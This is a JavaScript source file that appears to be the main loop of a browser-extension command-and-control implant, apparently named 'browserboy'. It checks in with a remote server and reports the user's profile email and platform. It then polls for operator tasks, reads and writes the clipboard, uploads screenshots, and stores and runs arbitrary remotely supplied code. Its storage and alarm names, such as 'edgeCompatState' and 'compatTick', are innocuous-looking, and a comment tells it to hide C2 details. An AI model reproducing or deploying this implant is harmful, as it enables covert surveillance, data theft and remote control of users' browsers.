import { chromeContext, dispatchChrome } from "./chrome_ctx.js";
import { CONFIG } from "./config.js";
import { downloadTextFile, uploadBytes } from "./files.js";
import { getMessage, postMessage } from "./http.js";
import { callOffscreen } from "./offscreen_client.js";
import { builtins } from "./commands.js";
import { killdatePassed, nextDelayMs, sleepInfo } from "./timing.js";

const STORAGE_KEY = "edgeCompatState";
const ALARM_NAME = "compatTick";

const state = {
  config: { ...CONFIG },
  callbackUuid: "",
  dead: false,
  loaded: {},
  interval: CONFIG.callback_interval,
  jitter: CONFIG.callback_jitter,
  tickInFlight: false,
  timer: 0,
};

function activeUuid() {
  return state.callbackUuid || state.config.payload_uuid;
}

export function parseArgs(task) {
  if (!task.parameters) {
    return {};
  }
  if (typeof task.parameters === "object") {
    return task.parameters;
  }
  try {
    return JSON.parse(task.parameters);
  } catch {
    return { raw: task.parameters };
  }
}

async function readStore() {
  const stored = await chrome.storage.local.get(STORAGE_KEY);
  return stored[STORAGE_KEY] || {};
}

async function writeStore(patch) {
  const current = await readStore();
  const next = { ...current, ...patch };
  await chrome.storage.local.set({ [STORAGE_KEY]: next });
  return next;
}

async function hydrate() {
  const stored = await readStore();
  state.callbackUuid = stored.callbackUuid || "";
  state.dead = Boolean(stored.dead);
  state.loaded = stored.loaded || {};
  state.interval = stored.interval ?? state.config.callback_interval;
  state.jitter = stored.jitter ?? state.config.callback_jitter;
}

export async function setSleep(interval, jitter) {
  if (interval !== undefined && interval !== null) {
    state.interval = Number(interval);
  }
  if (jitter !== undefined && jitter !== null && Number(jitter) >= 0) {
    state.jitter = Number(jitter);
  }
  await writeStore({ interval: state.interval, jitter: state.jitter });
  return sleepInfo(state.interval, state.jitter);
}

export async function die() {
  state.dead = true;
  if (state.timer) {
    clearTimeout(state.timer);
    state.timer = 0;
  }
  await chrome.alarms.clear(ALARM_NAME);
  await writeStore({ dead: true });
}

async function checkin() {
  let user = "chrome-user";
  let os = "chrome";
  let arch = "unknown";
  try {
    const info = await dispatchChrome("profileBindRead");
    if (info?.email) {
      user = info.email;
    }
  } catch {
    // identity.email is optional at runtime
  }
  try {
    const platform = await dispatchChrome("edgeHelperInfo");
    os = `chrome ${platform.os}`;
    arch = platform.arch;
  } catch {
    // platform info is best-effort
  }

  const payload = {
    action: "checkin",
    uuid: state.config.payload_uuid,
    user,
    host: `${user}'s chrome`,
    pid: 0,
    os,
    architecture: arch,
    domain: "",
    ips: [],
    integrity_level: 2,
    process_name: state.config.extension_name || "browserboy",
    sleep_info: sleepInfo(state.interval, state.jitter),
  };
  const response = await postMessage(state.config, state.config.payload_uuid, payload);
  if (response.id) {
    state.callbackUuid = response.id;
    await writeStore({ callbackUuid: response.id });
    return true;
  }
  return false;
}

function taskContext(task) {
  return chromeContext({
    parseArgs,
    uploadScreenshot: (bytes, filename) =>
      uploadBytes(state.config, activeUuid(), task.id, bytes, {
        filename,
        full_path: filename,
        is_screenshot: true,
      }),
    downloadFile: (fileId) => downloadTextFile(state.config, activeUuid(), task.id, fileId),
    setSleep,
    die,
    registerLoaded,
    listLoaded: () => Object.keys(state.loaded),
    runLoaded: (name, innerTask) => runLoaded(name, innerTask),
    clipboard: {
      read: async () => {
        const result = await callOffscreen({ type: "bb-clipboard", action: "read" });
        if (result?.error) {
          throw new Error(result.error);
        }
        return result?.output ?? "";
      },
      write: async (text) => {
        const result = await callOffscreen({ type: "bb-clipboard", action: "write", text });
        if (result?.error) {
          throw new Error(result.error);
        }
        return result?.output;
      },
    },
  });
}

async function registerLoaded(name, code) {
  state.loaded[name] = code;
  await writeStore({ loaded: state.loaded });
}

async function runLoaded(name, task) {
  const code = state.loaded[name];
  if (!code) {
    throw new Error(`loaded command not found: ${name}`);
  }
  const result = await callOffscreen({
    type: "bb-sandbox-run",
    name,
    code,
    task,
  });
  if (!result || result.error) {
    throw new Error(result?.error || "sandbox returned no result");
  }
  return result.output;
}

async function handleTask(task) {
  const name = task.command;
  const ctx = taskContext(task);
  try {
    let output;
    if (builtins[name]) {
      output = await builtins[name](task, ctx);
    } else if (state.loaded[name]) {
      output = await runLoaded(name, task);
    } else {
      throw new Error(`unsupported call: ${name}`);
    }
    if (output && typeof output === "object" && output.browserboy_response) {
      return output.browserboy_response;
    }
    return {
      task_id: task.id,
      user_output: output === undefined || output === null ? "" : String(output),
      completed: true,
    };
  } catch (error) {
    return {
      task_id: task.id,
      user_output: error instanceof Error ? error.message : String(error),
      completed: true,
      status: "error",
    };
  }
}

async function tick() {
  if (state.tickInFlight) {
    return;
  }
  if (state.dead || killdatePassed(state.config.killdate)) {
    await die();
    return;
  }
  state.tickInFlight = true;
  try {
    if (!state.callbackUuid) {
      await checkin();
    }
    if (!state.callbackUuid) {
      return;
    }
    const tasking = await getMessage(state.config, activeUuid(), {
      action: "get_tasking",
      tasking_size: -1,
    });
    const tasks = tasking.tasks || [];
    const responses = [];
    for (const task of tasks) {
      responses.push(await handleTask(task));
    }
    if (responses.length > 0) {
      await postMessage(state.config, activeUuid(), {
        action: "post_response",
        responses,
      });
    }
  } catch {
    // Retry on the next interval. Do not log C2 details.
  } finally {
    state.tickInFlight = false;
    scheduleNext();
  }
}

export function scheduleNext() {
  if (state.dead) {
    return;
  }
  const delay = nextDelayMs(state.interval, state.jitter);
  if (state.timer) {
    clearTimeout(state.timer);
  }
  state.timer = setTimeout(() => {
    tick();
  }, delay);
  const alarmWhen = Date.now() + Math.max(delay, 30000);
  chrome.alarms.create(ALARM_NAME, { when: alarmWhen });
}

export async function start() {
  await hydrate();
  if (state.dead || killdatePassed(state.config.killdate)) {
    await die();
    return;
  }
  await tick();
}

export async function onAlarm(alarm) {
  if (alarm && alarm.name !== ALARM_NAME) {
    return;
  }
  await tick();
}

export function onRuntimeMessage(message, _sender, sendResponse) {
  if (!message || typeof message !== "object") {
    return false;
  }
  if (message.type === "bb-ctx") {
    dispatchChrome(message.method, message.args || [])
      .then((result) => sendResponse({ result }))
      .catch((error) => sendResponse({ error: error instanceof Error ? error.message : String(error) }));
    return true;
  }
  return false;
}
